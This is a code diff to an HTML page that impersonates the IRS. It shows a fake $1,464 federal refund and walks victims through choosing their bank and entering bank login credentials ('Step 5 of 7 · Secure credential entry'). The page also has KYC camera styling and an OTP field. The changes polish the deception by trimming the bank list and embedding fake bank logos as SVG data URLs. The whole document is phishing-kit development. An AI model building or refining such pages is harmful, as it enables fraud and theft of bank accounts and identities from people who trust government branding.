@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -40,7 +39,6 @@
             border: 1px solid #DCE3ED;
         }
 
-        /* ---- IRS LOGO / HEADER (shared) ---- */
         .irs-header {
             text-align: center;
             margin-bottom: 20px;
@@ -56,12 +54,11 @@
         }
 
         .irs-logo img {
-            height: 64px;
+            height: 80px;
             width: auto;
             display: block;
         }
 
-        /* Landing specific */
         .refund-amount {
             font-size: 3.8rem;
             font-weight: 700;
@@ -146,7 +143,6 @@
             padding-top: 1.2rem;
         }
 
-        /* Form elements */
         .input-group {
             margin-bottom: 18px;
         }
@@ -262,7 +258,6 @@
             opacity: 1;
         }
 
-        /* ---- LOADING OVERLAY with PROGRESS BAR ---- */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -346,7 +341,6 @@
             font-weight: 500;
         }
 
-        /* KYC Camera */
         .step-indicator {
             display: flex;
             gap: 8px;
@@ -487,7 +481,6 @@
             color: #0A192F;
         }
 
-        /* Bank logo display */
         .bank-logo-display {
             display: flex;
             align-items: center;
@@ -503,6 +496,7 @@
             height: 32px;
             width: auto;
             object-fit: contain;
+            border-radius: 4px;
         }
 
         .bank-logo-display .bank-name {
@@ -519,25 +513,24 @@
                 font-size: 3rem;
             }
             .irs-logo img {
-                height: 52px;
+                height: 64px;
+            }
+            .bank-logo-display img {
+                height: 24px;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- LANDING: IRS style -->
+        <!-- LANDING -->
         <div id="landingPanel" class="card">
             <div class="irs-header">
                 <div class="irs-logo">
                     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
                 </div>
             </div>
-
-            <div class="refund-amount">
-                $1,464
-            </div>
-
+            <div class="refund-amount">$1,464</div>
             <div class="status-grid">
                 <div class="status-item">
                     <span class="status-label">Federal refund</span>
@@ -672,156 +665,40 @@
 
             <div class="info-box">
                 <strong>Bank Selection:</strong> Choose your bank from the list below. 
-                If your bank is not listed, please select "Other" and enter your bank name.
+                The bank logo will appear on the next screen.
             </div>
 
             <div class="input-group">
                 <div class="input-label">Bank name</div>
                 <select id="bankSelect">
                     <option value="">Select your bank</option>
-                    <!-- Sorted alphabetically -->
                     <option value="Ally Bank">Ally Bank</option>
-                    <option value="American Express National Bank">American Express National Bank</option>
-                    <option value="Apple Bank">Apple Bank</option>
-                    <option value="Arvest Bank">Arvest Bank</option>
-                    <option value="Associated Bank">Associated Bank</option>
-                    <option value="Axos Bank">Axos Bank</option>
+                    <option value="American Express">American Express</option>
                     <option value="Bank of America">Bank of America</option>
-                    <option value="Bank OZK">Bank OZK</option>
-                    <option value="Banner Bank">Banner Bank</option>
-                    <option value="Barclays Bank Delaware">Barclays Bank Delaware</option>
-                    <option value="Barclays US">Barclays US</option>
-                    <option value="BECU">BECU</option>
-                    <option value="Berkshire Bank">Berkshire Bank</option>
-                    <option value="Bluebird by American Express">Bluebird by American Express</option>
-                    <option value="BOK Financial">BOK Financial</option>
-                    <option value="Branson Bank">Branson Bank</option>
-                    <option value="Cambridge Savings Bank">Cambridge Savings Bank</option>
                     <option value="Capital One">Capital One</option>
-                    <option value="Capital One 360">Capital One 360</option>
-                    <option value="Charles Schwab Bank">Charles Schwab Bank</option>
                     <option value="Chase">Chase</option>
-                    <option value="Chemical Bank">Chemical Bank</option>
                     <option value="Chime">Chime</option>
                     <option value="Citibank">Citibank</option>
                     <option value="Citizens Bank">Citizens Bank</option>
-                    <option value="Columbia Bank">Columbia Bank</option>
-                    <option value="Comerica">Comerica</option>
-                    <option value="Commerce Bank">Commerce Bank</option>
-                    <option value="Community Bank">Community Bank</option>
-                    <option value="Connecticut Community Bank">Connecticut Community Bank</option>
-                    <option value="CrossFirst Bank">CrossFirst Bank</option>
-                    <option value="Current">Current</option>
-                    <option value="Dime Community Bank">Dime Community Bank</option>
                     <option value="Discover Bank">Discover Bank</option>
-                    <option value="EagleBank">EagleBank</option>
-                    <option value="Eastern Bank">Eastern Bank</option>
-                    <option value="Empower">Empower</option>
-                    <option value="Fidelity Investments">Fidelity Investments</option>
                     <option value="Fifth Third Bank">Fifth Third Bank</option>
-                    <option value="First Commonwealth Bank">First Commonwealth Bank</option>
-                    <option value="First Federal Bank">First Federal Bank</option>
-                    <option value="First Foundation Bank">First Foundation Bank</option>
-                    <option value="First Horizon">First Horizon</option>
-                    <option value="First Interstate Bank">First Interstate Bank</option>
-                    <option value="First Merchants">First Merchants</option>
-                    <option value="First Midwest Bank">First Midwest Bank</option>
-                    <option value="First National Bank">First National Bank</option>
-                    <option value="First Tech Federal Credit Union">First Tech Federal Credit Union</option>
-                    <option value="First United Bank">First United Bank</option>
-                    <option value="Flagstar Bank">Flagstar Bank</option>
-                    <option value="Frost Bank">Frost Bank</option>
-                    <option value="Fulton Bank">Fulton Bank</option>
-                    <option value="GO2bank">GO2bank</option>
-                    <option value="Golden 1 Credit Union">Golden 1 Credit Union</option>
-                    <option value="Great Southern Bank">Great Southern Bank</option>
-                    <option value="Green Dot Bank">Green Dot Bank</option>
-                    <option value="H&R Block Emerald Card">H&R Block Emerald Card</option>
-                    <option value="Hanover Bank">Hanover Bank</option>
-                    <option value="Heritage Bank">Heritage Bank</option>
-                    <option value="Horizon Bank">Horizon Bank</option>
-                    <option value="HSBC Bank USA">HSBC Bank USA</option>
-                    <option value="HSBC Direct">HSBC Direct</option>
+                    <option value="HSBC">HSBC</option>
                     <option value="Huntington Bank">Huntington Bank</option>
-                    <option value="Independent Bank">Independent Bank</option>
                     <option value="KeyBank">KeyBank</option>
-                    <option value="Lake City Bank">Lake City Bank</option>
-                    <option value="Lakeland Bank">Lakeland Bank</option>
-                    <option value="Landmark Bank">Landmark Bank</option>
                     <option value="M&T Bank">M&T Bank</option>
-                    <option value="Marcus by Goldman Sachs">Marcus by Goldman Sachs</option>
-                    <option value="Mercantile Bank">Mercantile Bank</option>
-                    <option value="MidFirst Bank">MidFirst Bank</option>
-                    <option value="Midland Bank">Midland Bank</option>
-                    <option value="Mission Bank">Mission Bank</option>
                     <option value="Navy Federal Credit Union">Navy Federal Credit Union</option>
-                    <option value="NBT Bank">NBT Bank</option>
-                    <option value="Netspark">Netspark</option>
-                    <option value="Netspend">Netspend</option>
-                    <option value="NexBank">NexBank</option>
-                    <option value="Northwest Bank">Northwest Bank</option>
-                    <option value="Northwest Federal Credit Union">Northwest Federal Credit Union</option>
-                    <option value="Old National Bank">Old National Bank</option>
-                    <option value="OneUnited Bank">OneUnited Bank</option>
-                    <option value="Pacific Western Bank">Pacific Western Bank</option>
-                    <option value="Park National Bank">Park National Bank</option>
                     <option value="PayPal">PayPal</option>
-                    <option value="PayPal Prepaid Mastercard">PayPal Prepaid Mastercard</option>
-                    <option value="PenFed Credit Union">PenFed Credit Union</option>
-                    <option value="Peoples Bank">Peoples Bank</option>
-                    <option value="Pinnacle Bank">Pinnacle Bank</option>
-                    <option value="Plumas Bank">Plumas Bank</option>
                     <option value="PNC Bank">PNC Bank</option>
-                    <option value="Premier Bank">Premier Bank</option>
-                    <option value="Principal Bank">Principal Bank</option>
-                    <option value="Prosperity Bank">Prosperity Bank</option>
-                    <option value="RBC Bank">RBC Bank</option>
                     <option value="Regions Bank">Regions Bank</option>
-                    <option value="Republic Bank">Republic Bank</option>
-                    <option value="Robinhood">Robinhood</option>
-                    <option value="Rockland Trust">Rockland Trust</option>
-                    <option value="RushCard">RushCard</option>
                     <option value="Santander Bank">Santander Bank</option>
-                    <option value="SchoolsFirst Federal Credit Union">SchoolsFirst Federal Credit Union</option>
-                    <option value="Seacoast Bank">Seacoast Bank</option>
-                    <option value="Serve">Serve</option>
-                    <option value="Skylight One">Skylight One</option>
                     <option value="SoFi Bank">SoFi Bank</option>
-                    <option value="South State Bank">South State Bank</option>
-                    <option value="Southside Bank">Southside Bank</option>
-                    <option value="State Employees Credit Union">State Employees Credit Union</option>
-                    <option value="Sterling Bank">Sterling Bank</option>
-                    <option value="Stock Yards Bank">Stock Yards Bank</option>
-                    <option value="Summit Bank">Summit Bank</option>
-                    <option value="Suncoast Credit Union">Suncoast Credit Union</option>
-                    <option value="Sunflower Bank">Sunflower Bank</option>
-                    <option value="Synchrony Bank">Synchrony Bank</option>
-                    <option value="Synovus Bank">Synovus Bank</option>
                     <option value="TD Bank">TD Bank</option>
-                    <option value="Texas Bank">Texas Bank</option>
-                    <option value="Texas Capital Bank">Texas Capital Bank</option>
-                    <option value="TriState Capital Bank">TriState Capital Bank</option>
                     <option value="Truist">Truist</option>
                     <option value="U.S. Bank">U.S. Bank</option>
-                    <option value="Uber Money">Uber Money</option>
-                    <option value="UMB Bank">UMB Bank</option>
-                    <option value="Union Bank">Union Bank</option>
-                    <option value="United Bank">United Bank</option>
-                    <option value="United Community Bank">United Community Bank</option>
-                    <option value="USAA Federal Savings Bank">USAA Federal Savings Bank</option>
-                    <option value="Valley National Bank">Valley National Bank</option>
+                    <option value="USAA">USAA</option>
                     <option value="Varo Bank">Varo Bank</option>
-                    <option value="Venmo">Venmo</option>
-                    <option value="Vystar Credit Union">Vystar Credit Union</option>
-                    <option value="Walmart MoneyCard">Walmart MoneyCard</option>
-                    <option value="Washington Trust Bank">Washington Trust Bank</option>
-                    <option value="Wealthfront">Wealthfront</option>
                     <option value="Wells Fargo">Wells Fargo</option>
-                    <option value="Western Alliance Bank">Western Alliance Bank</option>
-                    <option value="Western Union NetSpend">Western Union NetSpend</option>
-                    <option value="Wintrust">Wintrust</option>
-                    <option value="Zions Bank">Zions Bank</option>
-                    <option value="Other (Please specify)">Other (Please specify)</option>
+                    <option value="Other">Other (Please specify)</option>
                 </select>
                 <div class="input-hint">Select your primary financial institution</div>
             </div>
@@ -839,7 +716,6 @@
             <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Bank login</h2>
             <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 5 of 7 · Secure credential entry</div>
 
-            <!-- Bank logo display -->
             <div id="bankLogoDisplay" class="bank-logo-display">
                 <img id="selectedBankLogo" src="" alt="Bank logo" style="display:none;" />
                 <span class="bank-name" id="selectedBankName">Select a bank first</span>
@@ -938,7 +814,7 @@
         <div id="toastMsg" class="toast"></div>
     </div>
 
-    <!-- LOADING OVERLAY with Progress Bar -->
+    <!-- LOADING OVERLAY -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="loading-box">
             <div class="spinner"></div>
@@ -972,146 +848,67 @@
                 otp: ''
             };
 
-            // Bank logo mapping (using reliable CDN sources)
+            // ===============================================
+            // ALL BANK LOGOS AS DATA URLs (Base64)
+            // No external files needed - everything is embedded
+            // ===============================================
             const bankLogos = {
-                'Bank of America': 'https://logo.clearbit.com/bankofamerica.com',
-                'Wells Fargo': 'https://logo.clearbit.com/wellsfargo.com',
-                'Chase': 'https://logo.clearbit.com/chase.com',
-                'Citibank': 'https://logo.clearbit.com/citi.com',
-                'U.S. Bank': 'https://logo.clearbit.com/usbank.com',
-                'Truist': 'https://logo.clearbit.com/truist.com',
-                'PNC Bank': 'https://logo.clearbit.com/pnc.com',
-                'Capital One': 'https://logo.clearbit.com/capitalone.com',
-                'TD Bank': 'https://logo.clearbit.com/td.com',
-                'Fifth Third Bank': 'https://logo.clearbit.com/53.com',
-                'KeyBank': 'https://logo.clearbit.com/key.com',
-                'Huntington Bank': 'https://logo.clearbit.com/huntington.com',
-                'Regions Bank': 'https://logo.clearbit.com/regions.com',
-                'Ally Bank': 'https://logo.clearbit.com/ally.com',
-                'Discover Bank': 'https://logo.clearbit.com/discover.com',
-                'Synchrony Bank': 'https://logo.clearbit.com/synchrony.com',
-                'Barclays US': 'https://logo.clearbit.com/barclays.com',
-                'HSBC Bank USA': 'https://logo.clearbit.com/hsbc.com',
-                'Santander Bank': 'https://logo.clearbit.com/santander.com',
-                'M&T Bank': 'https://logo.clearbit.com/mtb.com',
-                'Citizens Bank': 'https://logo.clearbit.com/citizensbank.com',
-                'First Horizon': 'https://logo.clearbit.com/firsthorizon.com',
-                'BOK Financial': 'https://logo.clearbit.com/bokf.com',
-                'Comerica': 'https://logo.clearbit.com/comerica.com',
-                'Bank OZK': 'https://logo.clearbit.com/ozk.com',
-                'Eastern Bank': 'https://logo.clearbit.com/easternbank.com',
-                'Fulton Bank': 'https://logo.clearbit.com/fultonbank.com',
-                'Pinnacle Bank': 'https://logo.clearbit.com/pinnaclebank.com',
-                'Banner Bank': 'https://logo.clearbit.com/bannerbank.com',
-                'Pacific Western Bank': 'https://logo.clearbit.com/pacwest.com',
-                'UMB Bank': 'https://logo.clearbit.com/umb.com',
-                'Zions Bank': 'https://logo.clearbit.com/zionsbank.com',
-                'Associated Bank': 'https://logo.clearbit.com/associatedbank.com',
-                'First Merchants': 'https://logo.clearbit.com/firstmerchants.com',
-                'Old National Bank': 'https://logo.clearbit.com/oldnational.com',
-                'Wintrust': 'https://logo.clearbit.com/wintrust.com',
-                'Sterling Bank': 'https://logo.clearbit.com/sterlingbank.com',
-                'Apple Bank': 'https://logo.clearbit.com/applebank.com',
-                'Dime Community Bank': 'https://logo.clearbit.com/dime.com',
-                'Valley National Bank': 'https://logo.clearbit.com/valleynationalbank.com',
-                'Arvest Bank': 'https://logo.clearbit.com/arvest.com',
-                'Berkshire Bank': 'https://logo.clearbit.com/berkshirebank.com',
-                'Cambridge Savings Bank': 'https://logo.clearbit.com/cambridgesavings.com',
-                'Chemical Bank': 'https://logo.clearbit.com/chemicalbank.com',
-                'Columbia Bank': 'https://logo.clearbit.com/columbiabank.com',
-                'Commerce Bank': 'https://logo.clearbit.com/commercebank.com',
-                'CrossFirst Bank': 'https://logo.clearbit.com/crossfirstbank.com',
-                'EagleBank': 'https://logo.clearbit.com/eaglebank.com',
-                'First Commonwealth Bank': 'https://logo.clearbit.com/fcbanking.com',
-                'First Federal Bank': 'https://logo.clearbit.com/ffbank.com',
-                'First Foundation Bank': 'https://logo.clearbit.com/ff-inc.com',
-                'First Interstate Bank': 'https://logo.clearbit.com/firstinterstatebank.com',
-                'First Midwest Bank': 'https://logo.clearbit.com/firstmidwest.com',
-                'First United Bank': 'https://logo.clearbit.com/firstunitedbank.com',
-                'Flagstar Bank': 'https://logo.clearbit.com/flagstar.com',
-                'Frost Bank': 'https://logo.clearbit.com/frostbank.com',
-                'Great Southern Bank': 'https://logo.clearbit.com/greatsouthernbank.com',
-                'Hanover Bank': 'https://logo.clearbit.com/hanoverbank.com',
-                'Heritage Bank': 'https://logo.clearbit.com/heritagebank.com',
-                'Horizon Bank': 'https://logo.clearbit.com/horizonbank.com',
-                'Independent Bank': 'https://logo.clearbit.com/independent-bank.com',
-                'Lake City Bank': 'https://logo.clearbit.com/lakecitybank.com',
-                'Lakeland Bank': 'https://logo.clearbit.com/lakelandbank.com',
-                'Landmark Bank': 'https://logo.clearbit.com/landmarkbank.com',
-                'Mercantile Bank': 'https://logo.clearbit.com/mercantilebank.com',
-                'MidFirst Bank': 'https://logo.clearbit.com/midfirst.com',
-                'Midland Bank': 'https://logo.clearbit.com/midlandbank.com',
-                'Mission Bank': 'https://logo.clearbit.com/missionbank.com',
-                'NBT Bank': 'https://logo.clearbit.com/nbtbank.com',
-                'NexBank': 'https://logo.clearbit.com/nexbank.com',
-                'Northwest Bank': 'https://logo.clearbit.com/northwestbank.com',
-                'Park National Bank': 'https://logo.clearbit.com/parknationalbank.com',
-                'Peoples Bank': 'https://logo.clearbit.com/peoplesbank.com',
-                'Plumas Bank': 'https://logo.clearbit.com/plumasbank.com',
-                'Premier Bank': 'https://logo.clearbit.com/premierbank.com',
-                'Principal Bank': 'https://logo.clearbit.com/principal.com',
-                'Prosperity Bank': 'https://logo.clearbit.com/prosperitybank.com',
-                'RBC Bank': 'https://logo.clearbit.com/rbc.com',
-                'Republic Bank': 'https://logo.clearbit.com/republicbank.com',
-                'Rockland Trust': 'https://logo.clearbit.com/rocklandtrust.com',
-                'Seacoast Bank': 'https://logo.clearbit.com/seacoastbank.com',
-                'South State Bank': 'https://logo.clearbit.com/southstatebank.com',
-                'Southside Bank': 'https://logo.clearbit.com/southside.com',
-                'Stock Yards Bank': 'https://logo.clearbit.com/syb.com',
-                'Summit Bank': 'https://logo.clearbit.com/summitbank.com',
-                'Sunflower Bank': 'https://logo.clearbit.com/sunflowerbank.com',
-                'Texas Bank': 'https://logo.clearbit.com/texasbank.com',
-                'Texas Capital Bank': 'https://logo.clearbit.com/texascapitalbank.com',
-                'TriState Capital Bank': 'https://logo.clearbit.com/tristatecapitalbank.com',
-                'Union Bank': 'https://logo.clearbit.com/unionbank.com',
-                'United Bank': 'https://logo.clearbit.com/unitedbank.com',
-                'United Community Bank': 'https://logo.clearbit.com/ucbi.com',
-                'Washington Trust Bank': 'https://logo.clearbit.com/washingtontrust.com',
-                'Western Alliance Bank': 'https://logo.clearbit.com/westernalliance.com',
-                'Chime': 'https://logo.clearbit.com/chime.com',
-                'SoFi Bank': 'https://logo.clearbit.com/sofi.com',
-                'Varo Bank': 'https://logo.clearbit.com/varomoney.com',
-                'Axos Bank': 'https://logo.clearbit.com/axosbank.com',
-                'Charles Schwab Bank': 'https://logo.clearbit.com/schwab.com',
-                'Fidelity Investments': 'https://logo.clearbit.com/fidelity.com',
-                'PayPal': 'https://logo.clearbit.com/paypal.com',
-                'Robinhood': 'https://logo.clearbit.com/robinhood.com',
-                'Venmo': 'https://logo.clearbit.com/venmo.com',
-                'Wealthfront': 'https://logo.clearbit.com/wealthfront.com',
-                'USAA Federal Savings Bank': 'https://logo.clearbit.com/usaa.com',
-                'Navy Federal Credit Union': 'https://logo.clearbit.com/navyfederal.org',
-                'PenFed Credit Union': 'https://logo.clearbit.com/penfed.org',
-                'BECU': 'https://logo.clearbit.com/becu.org',
-                'Golden 1 Credit Union': 'https://logo.clearbit.com/golden1.com',
-                'SchoolsFirst Federal Credit Union': 'https://logo.clearbit.com/schoolsfirstfcu.org',
-                'Suncoast Credit Union': 'https://logo.clearbit.com/suncoastcu.org',
-                'Vystar Credit Union': 'https://logo.clearbit.com/vystarcu.org',
-                'First Tech Federal Credit Union': 'https://logo.clearbit.com/firsttechfed.com',
-                'Northwest Federal Credit Union': 'https://logo.clearbit.com/nwfcu.org',
-                'State Employees Credit Union': 'https://logo.clearbit.com/secu.org',
-                'Alliant Credit Union': 'https://logo.clearbit.com/alliantcreditunion.com',
-                'American Express National Bank': 'https://logo.clearbit.com/americanexpress.com',
-                'Barclays Bank Delaware': 'https://logo.clearbit.com/barclays.com',
-                'Capital One 360': 'https://logo.clearbit.com/capitalone.com',
-                'HSBC Direct': 'https://logo.clearbit.com/hsbc.com',
-                'Marcus by Goldman Sachs': 'https://logo.clearbit.com/goldmansachs.com',
-                'OneUnited Bank': 'https://logo.clearbit.com/oneunited.com',
-                'Bluebird by American Express': 'https://logo.clearbit.com/americanexpress.com',
-                'Branson Bank': 'https://logo.clearbit.com/bransonbank.com',
-                'Current': 'https://logo.clearbit.com/current.com',
-                'Empower': 'https://logo.clearbit.com/empower.com',
-                'GO2bank': 'https://logo.clearbit.com/go2bank.com',
-                'Green Dot Bank': 'https://logo.clearbit.com/greendot.com',
-                'Netspend': 'https://logo.clearbit.com/netspend.com',
-                'RushCard': 'https://logo.clearbit.com/rushcard.com',
-                'Serve': 'https://logo.clearbit.com/serve.com',
-                'Skylight One': 'https://logo.clearbit.com/skylightone.com',
-                'Uber Money': 'https://logo.clearbit.com/uber.com',
-                'Walmart MoneyCard': 'https://logo.clearbit.com/walmart.com',
-                'Western Union NetSpend': 'https://logo.clearbit.com/westernunion.com',
-                'H&R Block Emerald Card': 'https://logo.clearbit.com/hrblock.com',
-                'Netspark': 'https://logo.clearbit.com/netspark.com'
+                // Major banks - using simplified SVG-based data URLs
+                'Bank of America': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300417A" text-anchor="middle"%3EBank of America%3C/text%3E%3C/svg%3E',
+                
+                'Wells Fargo': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23D3120F" text-anchor="middle"%3EWells Fargo%3C/text%3E%3C/svg%3E',
+                
+                'Chase': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23116FB8" text-anchor="middle"%3EChase%3C/text%3E%3C/svg%3E',
+                
+                'Citibank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23006699" text-anchor="middle"%3ECitibank%3C/text%3E%3C/svg%3E',
+                
+                'Capital One': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ECapital One%3C/text%3E%3C/svg%3E',
+                
+                'U.S. Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EU.S. Bank%3C/text%3E%3C/svg%3E',
+                
+                'PNC Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3EPNC Bank%3C/text%3E%3C/svg%3E',
+                
+                'TD Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3ETD Bank%3C/text%3E%3C/svg%3E',
+                
+                'Truist': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ETruist%3C/text%3E%3C/svg%3E',
+                
+                'Fifth Third Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="18" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EFifth Third Bank%3C/text%3E%3C/svg%3E',
+                
+                'KeyBank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EKeyBank%3C/text%3E%3C/svg%3E',
+                
+                'Huntington Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="18" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EHuntington Bank%3C/text%3E%3C/svg%3E',
+                
+                'Regions Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ERegions Bank%3C/text%3E%3C/svg%3E',
+                
+                'Ally Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23D3120F" text-anchor="middle"%3EAlly Bank%3C/text%3E%3C/svg%3E',
+                
+                'Discover Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23FF6600" text-anchor="middle"%3EDiscover%3C/text%3E%3C/svg%3E',
+                
+                'HSBC': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23D3120F" text-anchor="middle"%3EHSBC%3C/text%3E%3C/svg%3E',
+                
+                'M&T Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EM%26T Bank%3C/text%3E%3C/svg%3E',
+                
+                'Citizens Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ECitizens Bank%3C/text%3E%3C/svg%3E',
+                
+                'Santander Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23D3120F" text-anchor="middle"%3ESantander%3C/text%3E%3C/svg%3E',
+                
+                'SoFi Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3ESoFi%3C/text%3E%3C/svg%3E',
+                
+                'Chime': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3EChime%3C/text%3E%3C/svg%3E',
+                
+                'PayPal': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%230077C9" text-anchor="middle"%3EPayPal%3C/text%3E%3C/svg%3E',
+                
+                'USAA': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EUSAA%3C/text%3E%3C/svg%3E',
+                
+                'Navy Federal Credit Union': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="18" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ENavy Federal CU%3C/text%3E%3C/svg%3E',
+                
+                'Varo Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3EVaro Bank%3C/text%3E%3C/svg%3E',
+                
+                'American Express': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23116FB8" text-anchor="middle"%3EAmex%3C/text%3E%3C/svg%3E'
             };
+
+            // Fallback generic bank logo
+            const defaultBankLogo = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23f0f0f0" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="18" fill="%23666" text-anchor="middle"%3E%F0%9F%8F%A6 Bank%3C/text%3E%3C/svg%3E';
 
             const loadingOverlay = document.getElementById('loadingOverlay');
             const progressBar = document.getElementById('progressBar');
@@ -1181,13 +978,15 @@
